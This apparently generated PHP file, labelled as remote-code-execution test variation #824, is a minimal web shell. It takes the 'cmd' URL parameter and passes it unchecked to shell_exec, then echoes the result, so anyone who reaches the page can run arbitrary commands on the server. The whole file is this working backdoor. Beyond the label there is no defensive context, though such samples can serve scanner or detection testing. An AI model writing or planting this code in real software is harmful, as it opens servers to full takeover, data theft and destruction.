<?php
// RCE test variation #824
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>